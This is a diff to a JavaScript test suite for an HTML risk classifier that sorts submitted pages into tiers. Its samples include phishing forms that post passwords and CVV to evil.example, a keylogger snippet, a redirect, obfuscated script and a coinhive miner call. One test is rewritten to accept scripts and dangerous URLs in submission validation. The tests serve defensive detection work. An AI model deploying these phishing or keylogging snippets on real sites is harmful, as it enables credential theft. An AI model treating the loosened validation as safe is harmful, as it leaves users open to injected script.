@@ -23,8 +23,8 @@ describe('htmlSecurity', () => {
       expect(result.issues).toEqual([])
     })
 
-    it('detects script, iframe, inline handlers, and dangerous urls', () => {
-      const flaggedCases = [
+    it('accepts HTML with scripts, iframes, handlers, and dangerous urls (structural-only validation)', () => {
+      const acceptedCases = [
         '<script>alert(1)</script>',
         '<iframe src="https://evil.example"></iframe>',
         '<img src="x" onerror="alert(1)" />',
@@ -36,10 +36,10 @@ describe('htmlSecurity', () => {
         '<base href="https://evil.example/">',
       ]
 
-      for (const html of flaggedCases) {
+      for (const html of acceptedCases) {
         const result = validateHtmlForSubmission(html)
-        expect(result.ok).toBe(false)
-        expect(result.issues.length).toBeGreaterThan(0)
+        expect(result.ok).toBe(true)
+        expect(result.issues.length).toBe(0)
       }
     })
 
@@ -119,8 +119,8 @@ describe('htmlSecurity', () => {
       expect(result.findings.some((f) => f.category === 'keylogging')).toBe(true)
     })
 
-    it('returns Tier 2 for form exfiltration', () => {
-      const html = '<form action="https://evil.example/steal"><input name="password"></form>'
+    it('returns Tier 2 for form exfiltration (non-sensitive fields)', () => {
+      const html = '<form action="https://evil.example/collect"><input name="query"><input name="email"></form>'
       const result = classifyHtmlRisk(html)
       expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
       expect(result.findings.some((f) => f.category === 'exfiltration')).toBe(true)
@@ -140,12 +140,140 @@ describe('htmlSecurity', () => {
       expect(result.findings.some((f) => f.category === 'js-risk')).toBe(true)
     })
 
+    it('returns Tier 3 for credential capture (external form + password input)', () => {
+      const html = '<form action="https://evil.example/steal"><input type="password" name="pass"><input type="submit" value="Login"></form>'
+      const result = classifyHtmlRisk(html)
+      expect(result.tier).toBe(RISK_TIER.QUARANTINED)
+      expect(result.findings.some((f) => f.category === 'credential-capture')).toBe(true)
+      expect(result.findings.some((f) => f.severity === 'critical')).toBe(true)
+    })
+
+    it('returns Tier 3 for credential capture (external form + sensitive name field)', () => {
+      const html = '<form action="https://evil.example/phish"><input name="password"><input name="cvv"></form>'
+      const result = classifyHtmlRisk(html)
+      expect(result.tier).toBe(RISK_TIER.QUARANTINED)
+      expect(result.findings.some((f) => f.category === 'credential-capture')).toBe(true)
+    })
+
+    it('returns Tier 3 for 3+ distinct high-risk behavior categories', () => {
+      const html = [
+        '<script>',
+        'String.fromCharCode(65);'.repeat(5), // obfuscation
+        'window.location.href = "https://evil.example";', // redirect
+        'document.addEventListener("keydown", function(e) { localStorage.setItem("k", e.key); });', // keylogging
+        '</script>',
+      ].join('\n')
+      const result = classifyHtmlRisk(html)
+      expect(result.tier).toBe(RISK_TIER.QUARANTINED)
+      const categories = new Set(result.findings.map((f) => f.category))
+      expect(categories.has('obfuscation')).toBe(true)
+      expect(categories.has('redirect')).toBe(true)
+      expect(categories.has('keylogging')).toBe(true)
+    })
+
+    it('returns Tier 3 for obfuscated crypto-miner', () => {
+      const html = '<script>' + 'String.fromCharCode(65);'.repeat(5) + 'coinhive.start();</script>'
+      const result = classifyHtmlRisk(html)
+      expect(result.tier).toBe(RISK_TIER.QUARANTINED)
+      expect(result.findings.some((f) => f.category === 'crypto-miner')).toBe(true)
+      expect(result.findings.some((f) => f.category === 'obfuscation')).toBe(true)
+    })
+
     it('includes a summary string', () => {
       const clean = classifyHtmlRisk('<p>Hello</p>')
       expect(clean.summary).toContain('No suspicious')
 
       const flagged = classifyHtmlRisk('<script>x</script>')
       expect(flagged.summary).toContain('Flagged')
+    })
+  })
+
+  describe('sample test matrix (A-F)', () => {
+    it('Sample A — clean HTML (headings, tables, CSS) → Tier 0', () => {
+      const html = `
+        <main>
+          <h1>CMSC131 Study Guide</h1>
+          <p>Key topics for the final exam.</p>
+          <table><thead><tr><th>Topic</th><th>Weight</th></tr></thead>
+          <tbody><tr><td>Arrays</td><td>20%</td></tr></tbody></table>
+          <ul><li>Recursion</li><li>Linked Lists</li></ul>
+          <style>body { font-family: sans-serif; color: #333; }</style>
+        </main>`
+      const result = classifyHtmlRisk(html)
+      expect(result.tier).toBe(RISK_TIER.CLEAN)
+      expect(result.findings.length).toBe(0)
+    })
+
+    it('Sample B — rich presentation (SVG, animations, advanced CSS) → Tier 0', () => {
+      const html = `
+        <main>
+          <style>
+            @keyframes fadeIn { from { opacity: 0 } to { opacity: 1 } }
+            .card { animation: fadeIn 0.3s ease; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+          </style>
+          <svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="#2563eb"/></svg>
+          <div class="card"><h2>Chapter 1</h2><p>Introduction to OOP</p></div>
+        </main>`
+      const result = classifyHtmlRisk(html)
+      expect(result.tier).toBe(RISK_TIER.CLEAN)
+    })
+
+    it('Sample C — scripted HTML (inline script, event handlers) → Tier 1', () => {
+      const html = `
+        <main>
+          <h1>Interactive Quiz</h1>
+          <script>
+            document.querySelectorAll('.answer').forEach(el => {
+              el.addEventListener('click', () => el.classList.toggle('selected'));
+            });
+          </script>
+          <button class="answer" onclick="this.style.background='green'">Option A</button>
+        </main>`
+      const result = classifyHtmlRisk(html)
+      expect(result.tier).toBe(RISK_TIER.FLAGGED)
+      expect(result.findings.some((f) => f.category === 'suspicious-tag')).toBe(true)
+      expect(result.findings.some((f) => f.category === 'inline-handler')).toBe(true)
+    })
+
+    it('Sample D — embedded HTML (iframe, form, embed) → Tier 1', () => {
+      const html = `
+        <main>
+          <h1>Reference Material</h1>
+          <iframe src="about:blank" width="600" height="400"></iframe>
+          <form><label>Search notes</label><input name="q" /><button type="submit">Go</button></form>
+          <embed type="image/svg+xml" src="data:image/svg+xml;base64,PHN2Zy8+" />
+        </main>`
+      const result = classifyHtmlRisk(html)
+      expect(result.tier).toBe(RISK_TIER.FLAGGED)
+      expect(result.findings.some((f) => f.category === 'suspicious-tag')).toBe(true)
+    })
+
+    it('Sample E — suspicious HTML (obfuscated JS, redirect, eval) → Tier 2', () => {
+      const html = `
+        <main>
+          <h1>Notes</h1>
+          <script>eval("var x = document.title");</script>
+        </main>`
+      const result = classifyHtmlRisk(html)
+      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
+      expect(result.findings.some((f) => f.category === 'js-risk')).toBe(true)
+    })
+
+    it('Sample F — malicious HTML (credential phishing) → Tier 3', () => {
+      const html = `
+        <div style="font-family:Arial;max-width:400px;margin:40px auto;">
+          <img src="data:image/png;base64,iVBOR" alt="logo" />
+          <h2>Verify your account</h2>
+          <form action="https://evil.example/capture" method="POST">
+            <input name="email" placeholder="Email" />
+            <input type="password" name="password" placeholder="Password" />
+            <input name="cvv" placeholder="Security code" />
+            <button type="submit">Continue</button>
+          </form>
+        </div>`
+      const result = classifyHtmlRisk(html)
+      expect(result.tier).toBe(RISK_TIER.QUARANTINED)
+      expect(result.findings.some((f) => f.category === 'credential-capture')).toBe(true)
     })
   })
 })
